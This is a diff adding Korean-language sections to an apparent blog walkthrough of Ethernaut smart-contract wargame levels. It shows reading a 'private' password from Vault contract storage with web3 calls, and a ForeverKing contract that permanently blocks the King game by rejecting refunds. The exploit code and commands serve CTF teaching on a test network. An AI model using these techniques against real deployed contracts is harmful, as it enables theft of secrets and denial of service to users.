@@ -559,9 +559,187 @@ web3.utils.toChecksumAddress("0xb0a4e462094dd81a4e1cf7c724ebb4e5583248df")
 ### 8. Vault (difficulty 3/10)
 
 이 문제는 금고의 비밀번호를 알아내는 것입니다.
+비밀번호는 문제의 컨트랙트가 배포될 때 외부에서 지정된 것이므로 알 수가 없습니다. 또 비밀번호를 저장하는 상태변수 `bytes32 private password`는 private이므로
+getter 함수가 자동으로 생성되지 않습니다.
+
+그런데 여기에 함정이 있습니다. 상태변수의 private은 자바의 private과는 성격이 다릅니다. 솔리디티에서는 private이라고 해도 블록체인에서 읽기 가능한 값입니다.
+읽기 메소드가 없는데 어떻게 읽을 수 있을까요? 직접 컨트랙트의 상태변수 저장영역에 접근해서 읽으면 됩니다.
+
+상태변수의 저장영역에 관한 자세한 내용은 다음 [자료][storage]를 참고하기 바랍니다. 아무튼 컨트랙트의 상태변수는 블록체인 persistence에 해당한다고 할 수 있겠습니다.
+"슬롯"이라는 개념으로 저장되며 각 슬롯은 32바이트(256비트) 크기로 0번 슬롯부터 차례로, 연속적으로 할당됩니다.
+
+예를 들어 다음과 같은 두 개의 상태변수를 선언하면 2개의 슬롯을 사용할 것이고, 아마 첫 번째 슬롯(0번)에는 a, 그리고 b는 두 번째 슬롯(1번)에 저장될 것입니다. 한 슬롯에 들어맞는
+타입은 한 슬롯을 모두 차지하고 슬롯보다 작은 경우에는 "tightly packed"하게 들어갑니다.
+
+{% highlight javascript %}
+uint128 public a
+uint256 public b
+{% endhighlight %}
+
+그렇다면 이제 문제의 컨트랙트를 살펴보겠습니다. 비밀번호를 저장할 password는 bytes32이므로 고정길이 배열입니다. 슬롯크기와 같으므로 두 번째 슬롯을 차지할 것입니다.
+
+{% highlight javascript %}
+pragma solidity ^0.4.18;
+
+contract Vault {
+    bool public locked;
+    bytes32 private password;
+
+    function Vault(bytes32 _password) public {
+        locked = true;
+        password = _password;
+    }
+
+    function unlock(bytes32 _password) public {
+        if (password == _password) {
+            locked = false;
+        }
+    }
+}
+{% endhighlight %}
+
+web3.js를 사용하여 컨트랙트의 저장영역을 읽을 수 있습니다. `web3.eth.getStorageAt`을 사용하면 됩니다.
+
+{% highlight javascript %}
+web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])
+{% endhighlight %}
+
+컨트랙트 주소(address), 슬롯 위치(position), 블록번호(defaultBlock)를 알아야 합니다. 우선 이 컨트랙트가 배포되었을 때 몇 번 블록에 배포 트랙잭션이 기록되었는지 알아보겠습니다.
+컨트랙트의 인스턴스를 생성한 후 콘솔에서 다음과 같이 입력합니다.
+
+{% highlight html %}
+await getBlockNumber()
+4414575
+{% endhighlight %}
+
+그 다음은 약간 번거로운 과정을 거쳐야 합니다. web3 모듈을 사용하기 위해서는 별도의 자바스크립트 콘솔(geth에서 제공하는 콘솔과 같은)을 사용해야 합니다.
+여기서는 트러플을 사용해보기로 합니다.
+
+{% highlight javascript %}
+truffle(ropsten)> web3.eth.getStorageAt('0xe00fc9b4684294124392952873b0e7f8bc5b5408', 1, 4414575,
+                  function(e, result) {
+                      console.log(result)
+                  })
+undefined
+truffle(ropsten)> 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+{% endhighlight %}
+
+
+bytes32 타입이므로 아스키로 변환합니다.
+
+<font size="2">
+{% highlight javascript %}
+truffle(ropsten)> web3.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+'A very strong secret password :)'
+{% endhighlight %}
+</font>
+
+아하, 비밀번호가 저것이군요! 이제 컨트랙트의 unlock 메소드를 실행하면서 파라미터로 비밀번호를 전달합니다. bytes32 타입의 문자열을 그대로 전달하면 되겠습니다.
+
+{% highlight html %}
+contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+await contract.locked()
+false
+{% endhighlight %}
+
+
+### 9. King (difficulty 6/10)
+
+난이도가 6입니다. 어려운 문제인 것 같습니다.
+
+> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
+
+
+문제의 컨트랙트는 현재 prize 값보다 더 많은 이더를 보내면 king을 그것을 전송한 계정으로 변경하는 컨트랙트입니다.
+대신에 전임 king 계정에게 이더를 바로 보내주는 군요(피라미드 판매 방식?).
+
+
+{% highlight javascript %}
+function() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+}
+{% endhighlight %}
+
+현재 prize 값보다 큰 이더를 보내서 king이 된다해도 owner 계정은 여전히 king을 되찾을 수 있고 또 이전 prize보다 높은 이더를 전송하는 계정은 언제든지
+king이 될 수 있습니다. 이 문제를 패스하려면 이러한 "계약"이 정상적으로 동작하지 않도록 해야 합니다.
+
+> Such a fun game. Your goal is to break it.
+
+현재 컨트랙트의 prize 값을 조회해보겠습니다.
+
+{% highlight html %}
+a = await contract.prize()
+t {s: 1, e: 18, c: Array(1)}
+fromWei(a.toNumber())
+"1"
+{% endhighlight %}
+
+현재 king 계정을 조회합니다. 이더를 얼마나 가지고 있을까요?
+
+{% highlight html %}
+await contract.king()
+"0x32d25a51c4690960f1d18fadfa98111f71de5fa7"
+
+await getBalance("0x32d25a51c4690960f1d18fadfa98111f71de5fa7")
+"786.9242373303112"
+
+{% endhighlight %}
+
+
+⚠️문제 오류?
+
+그냥 현재 prize 값 1 이더보다 크거나 같은 값을 전송하여 king이 바뀌면 패스됩니다. 😅
+
+그러나 원래 이 문제가 의도했던 것은 이렇습니다: 다른 컨트랙트를 만든 후 King 컨트랙트의 폴백 함수를 호출합니다. 이 때 1 이더 이상을 전송하면
+king이 바뀌게 됩니다. 그런데 이 컨트랙트에 폴백 함수를 구현하지 않으면 `king.transfer(msg.value)`에서 오류가 발생하면서 롤백이 될 것입니다.
+나중에 owner 계정이나 prize 값보다 더 많은 이더를 전송하더라도 king은 바뀌지 않게 됩니다. 현재 king은 영원히 king으로 남는 것입니다.
+
+주의할 점은 컨트랙트가 이더를 소유해야 하기 때문에 초기 이더를 받을 수 있도록 생성자를 payable로 만들어야 한다는 점입니다.
+
+{% highlight javascript %}
+pragma solidity ^0.4.25;
+
+contract ForeverKing {
+
+    address public owner;
+    King public king;
+
+    constructor(address _addr) public payable {
+        owner = msg.sender;
+        king = King(_addr);
+    }
+
+    modifier onlyOwner {
+        require (msg.sender == owner, "Only owner can call this function.");
+        _;
+    }
+
+    function getOwnership() external onlyOwner {
+        uint val = 1 ether;
+        bool bOk = address(king).call.value(val).gas(3000000)();
+        if (!bOk) {
+            revert();
+        }
+    }
+}
+
+contract King {
+}
+{% endhighlight %}
+
+### 10. Re-entrancy (difficulty 6/10)
+
+
+
 
 [ethernaut]: https://ethernaut.zeppelin.solutions/
 [ethernaut-gh]: https://github.com/OpenZeppelin/ethernaut
 [faucet]: https://faucet.metamask.io/
 [remix]: http://remix.ethereum.org/
 [safemath]: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
+[storage]: https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html?highlight=storage
+
+
